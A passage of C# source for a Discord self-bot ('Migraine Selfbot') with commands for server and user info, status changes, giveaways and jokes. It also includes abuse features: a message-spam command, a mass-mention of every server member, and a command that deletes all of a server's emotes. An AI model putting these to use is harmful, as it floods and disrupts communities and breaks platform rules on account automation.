                        await Context.Channel.SendMessageAsync("", false, embed2.Build(), null);
                        break;
                    }
                }
            }
        }

        [Command("cquote")]
        public async Task CopyQuote(/*[Remainder]*/ ulong id)
        {
            await Context.Message.DeleteAsync(null);
            IEnumerable<IMessage> enumerable = await Context.Channel.GetMessagesAsync(100, CacheMode.AllowDownload, null).FlattenAsync<IMessage>();
            IEnumerable<IMessage> messages = enumerable;
            enumerable = null;
            foreach (IMessage message in messages)
            {
                if (message.Id.ToString().Contains(id.ToString()))
                {
                    author = message.Author.Username + "#" + message.Author.Discriminator;
                    Content = message.Content;
                    Channel = Context.Channel.Name;
                    Time = message.Timestamp.LocalDateTime.ToShortDateString();
                    break;
                }
            }
        }
        public static string author;

        public static string Content;

        public static string Channel;

        public static string Time;

        [Command("spfp")]
        public async Task spfp()
        {
            await Context.Message.DeleteAsync();
            string serveravatar = Context.Guild.IconUrl;
            var embed = new EmbedBuilder();
            embed.WithImageUrl(serveravatar);
            embed.WithColor(Globals.EmbedHexColor);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("sstats")]
        public async Task sstats()
        {
            await Context.Message.DeleteAsync();
            string serveravatar = Context.Guild.IconUrl;
            var server = Context.Guild;
            var embed = new EmbedBuilder();
            embed.WithThumbnailUrl(serveravatar);
            embed.AddField("**Server Name:** ", $" {server.Name}");
            embed.AddField("**Server Owner:** ", $"{server.OwnerId}");
            embed.AddField("**Server Created:** ", $" {server.CreatedAt}");
            embed.AddField("**Server ID:**", $"{server.Id}");
            embed.AddField("**Verification Level:**", $"{server.VerificationLevel}");
            embed.AddField("**Emotes:**", $"{server.Emotes.Count.ToString()}");
            embed.AddField("**Roles:**", $"{server.Roles.Count.ToString()}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("spam")]
        public async Task spam(string message) // fix
        {
            bool nullable = message == null;
            if (nullable)
                ConsoleLog.Log("Message null, try [message <amount>]");
            else
                await Context.Message.DeleteAsync();
            string[] msgarr = message.Split(new char[] { ' ' });
            int i = Convert.ToInt32(msgarr[msgarr.Length - 1]);
            for (int j = 0; j < i; j++)
                await Context.Channel.SendMessageAsync(message.Replace(i.ToString(), ""), false, null);
        }

        [Command("stats")]
        public async Task stats()
        {
            await Context.Message.DeleteAsync();
            TimeSpan time = DateTime.Now - Process.GetCurrentProcess().StartTime;
            string upTime = "Been Alive For: ";
            bool Day = time.Days > 0;
            if (Day)
            {
                bool Hour = time.Hours <= 0 || time.Minutes <= 0;
                if (Hour)
                {
                    upTime += string.Format("{0} Day(s) and ", time.Days);
                }
                else
                {
                    upTime += string.Format("{0} Day(s),", time.Days);
                }
            }
            bool Minute = time.Hours > 0;
            if (Minute)
            {
                bool flag4 = time.Minutes > 0;
                if (flag4)
                {
                    upTime += string.Format(" {0} Hour(s), ", time.Hours);
                }
                else
                {
                    upTime += string.Format("{0} Hour(s) And ", time.Hours);
                }
            }
            bool Second = time.Minutes > 0;
            if (Second)
            {
                upTime += string.Format("{0} Minute(s)", time.Minutes);
            }
            bool MilSec = time.Seconds >= 0;
            if (MilSec)
            {
                bool flag7 = time.Hours > 0 || time.Minutes > 0;
                if (flag7)
                {
                    upTime += string.Format(" And {0} Second(s)", time.Seconds);
                }
                else
                {
                    upTime += string.Format("{0} Second(s)", time.Seconds);
                }
            }
            Process process = Process.GetCurrentProcess();
            long mem = process.PrivateMemorySize64;
            long memory = mem / 1024L / 1024L;
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithAuthor("Migraine Selfbot Stats", Globals.MigraineImageURL);
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithTimestamp(DateTimeOffset.UtcNow.UtcDateTime);
            embed.WithThumbnailUrl(Context.User.GetAvatarUrl(ImageFormat.Auto, 128));
            embed.WithFooter("Migraine Selfbot Stats");
            embed.AddField("Memory Usage:", string.Format("```fix\n{0}Mb```", memory), true);
            embed.AddField("Up-time:", "```prolog\n" + upTime + "```", true);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }


        [Command("playing")]
        public async Task Playing([Remainder] string args)
        {
            await Context.Message.DeleteAsync();
            await (Context.Client as DiscordSocketClient).SetGameAsync(args, null, ActivityType.Playing);
            await Context.Channel.SendMessageAsync($"Successfully changed status to '**{args}**'");
        }
        [Command("typing")]
        public async Task Typing()
        {
            await Context.Message.DeleteAsync();
            await Context.Channel.TriggerTypingAsync();
        }

        [Command("streaming")]
        public async Task Streaming([Remainder] string args)
        {
            await Context.Message.DeleteAsync();
            await (Context.Client as DiscordSocketClient).SetGameAsync(args, "https://twitch.tv/ninja", ActivityType.Streaming);
            await Context.Channel.SendMessageAsync($"Successfully changed status to '**{args}**'");
        }

        [Command("tcolor")]
        public async Task TextColor(string message, string args)
        {
            await Context.Message.DeleteAsync();
            if (args.Length > 1)
                if (message.Equals("orange"))
                    await Context.Channel.SendMessageAsync("```fix\n" + args + "```");
                else if (message == "green")
                    await Context.Channel.SendMessageAsync("```css\n" + args + "```");
                else if (message.Equals("cyan"))
                    await Context.Channel.SendMessageAsync("```yaml\n" + args + "```");
                else if (message.Equals("red"))
                    await Context.Channel.SendMessageAsync("```diff\n" + "- " + args + "```");
                else
                    await Context.Channel.SendMessageAsync("**Invalid Color.**");
                    Thread.Sleep(1000);
                    await Context.Message.DeleteAsync();
        }

        [Command("unban")]
        [RequireUserPermission(GuildPermission.BanMembers)]
        public async Task Unban(/*[Remainder]*/ ulong userName)
        {
            await Context.Guild.RemoveBanAsync(userName, null);
            await ReplyAsync(string.Format("I Unbanned {0}", userName), false, null, null);
            ConsoleLog.Log($"Unbanned {userName} from " + Context.Guild.Name);
        }

        [Command("userinfo")]
        public async Task UserInformation(SocketGuildUser user = null)
        {
            await Context.Message.DeleteAsync();
            List<string> RolesString = new List<string>();
            EmbedBuilder embed = new EmbedBuilder();

            if (user == null)
                user = (Context.Message.Author as SocketGuildUser);

            foreach (SocketRole role in user.Roles)
                RolesString.Add(role.Mention);

            embed.WithAuthor(user);
            embed.WithThumbnailUrl(user.GetAvatarUrl(ImageFormat.Auto, 128));
            embed.AddField("Bot", user.IsBot, true);
            embed.AddField("Status", user.Activity, true);
            embed.AddField("Created Account", user.CreatedAt.DateTime.ToString(), true);
            embed.AddField("Joined Server", user.JoinedAt.ToString().Split(new char[]
            {
                '+'
            })[0], true);
            embed.AddField(string.Format("Roles[{0}]", RolesString.Count), string.Join(", ", RolesString), false);
            embed.AddField("Playing", user.Status.ToString(), false);
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter(string.Format("ID: {0} - Today at {1}", user.Id, DateTime.Now.ToShortTimeString()), null);
            await Context.Channel.SendMessageAsync("", false, embed.Build(), null);
        }

        [Command("giveaway")]
        public async Task CreateGiveaway(string info)
        {
            var random = new Random();
            await Context.Message.DeleteAsync();
            bool noinfo = info == null;
            if (noinfo)
                await Context.Channel.SendMessageAsync($"What are you going to giveaway? ex:({Globals.Prefix}giveaway Discord Nitro 24h)");
            else if (Globals.UsersEntered.Count != 0)
                await Context.Channel.SendMessageAsync("You can only have 1 giveaway at a time!");
            else
            {
                string[] GetEndTime = info.Split(new char[]
                {
                    ' '
                });
                int TimeTillEnd = 0;
                int num = 0;
                try
                {
                    ConsoleLog.Log(GetEndTime[GetEndTime.Length - 1]);
                    TimeTillEnd = Convert.ToInt32(GetEndTime[GetEndTime.Length - 1].Replace("h", ""));
                    info = info.Replace(GetEndTime[GetEndTime.Length - 1], "");
                }
                catch
                {
                    num = 1;
                }
                if (num != 1)
                {
                    Globals.StartTime = DateTime.Now;
                    Globals.TimeToEnd = DateTime.Now.AddHours((double)TimeTillEnd);
                    var emoji = new Emoji("\ud83c\udf81");
                    var host = Context.User;
                    var embed = new EmbedBuilder();
                    embed.WithAuthor(host);
                    embed.WithTitle($"{host.Username} has started a giveaway!");
                    embed.WithDescription(string.Format("{0}\n React with {1} to enter this giveaway", info, emoji));
                    embed.WithColor(Globals.EmbedHexColor);
                    embed.WithFooter("Starts - " + Globals.StartTime.ToString() + " - Ends - " + Globals.TimeToEnd.ToString());
                    IUserMessage userMessage2 = await Context.Channel.SendMessageAsync("", false, embed.Build());
                    IUserMessage userMessage = userMessage2;
                    userMessage2 = null;
                    IUserMessage msg = userMessage;
                    await msg.AddReactionAsync(emoji);
                    Globals.Giveawayname = info;
                    Globals.GiveawayMessasge = Context.Message.Id;
                    Globals.GiveawayChannel = Context.Message.Channel.Id;
                }
                else
                {
                    await Context.Channel.SendMessageAsync("Invalid Time");
                }
                //var emoji = new Emoji("\ud83c\udf81");
                //IReadOnlyCollection<IUser> getreactions = Context.Message.GetReactionUsersAsync(emoji, 1000);
                //if (getreactions.Count > 0)
                //{

                //} fix later!!!!!
            }
        }
        [Command("delemoji")]
        public async Task DeleteEmojis()
        {
            await Context.Message.DeleteAsync();
            var Emojis = Context.Guild.Emotes;
            foreach (var emoji in Emojis)
            {
                await Context.Guild.DeleteEmoteAsync(emoji);
            }
        }
        [Command("xoxo")]
        public async Task XOXO()
        {
            if (Context.User.Id.ToString() == Context.Client.CurrentUser.Id.ToString())
            {
                await Context.Message.DeleteAsync();

                string mention = "";

                var users = await Context.Guild.GetUsersAsync();

                foreach (SocketGuildUser member in users)
                {
                    if (member.IsBot)
                        continue;
                    mention += member.Mention + " ";
                    if (mention.Length >= 1977)
                    {
                        await Context.Channel.SendMessageAsync(mention);
                        Thread.Sleep(500);
                        await Context.Message.DeleteAsync();
                        mention = "";
                    }
                    await Context.Channel.SendMessageAsync(mention);
                    Thread.Sleep(500);
                    await Context.Message.DeleteAsync();
                }
            }
        }
        [Command("sizepp")]
        public async Task SizePenis([Remainder] SocketGuildUser user)
        {
            await Context.Message.DeleteAsync();
            if (user == null)
                user = (Context.Message.Author as SocketGuildUser);
            var random = new Random();
            string[] rand = new string[]
            {
                "Very Small pp",
                "Moderate pp",
                "Large pp",
                "EXTREMELY LARGE PP"
            };
            var embed = new EmbedBuilder();
            embed.WithAuthor($"{Context.Message.Author}", Globals.MigraineImageURL);
            embed.WithDescription($"User @{user} has a " + $"``{rand[random.Next(0, rand.Length)]}``");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
    }
}
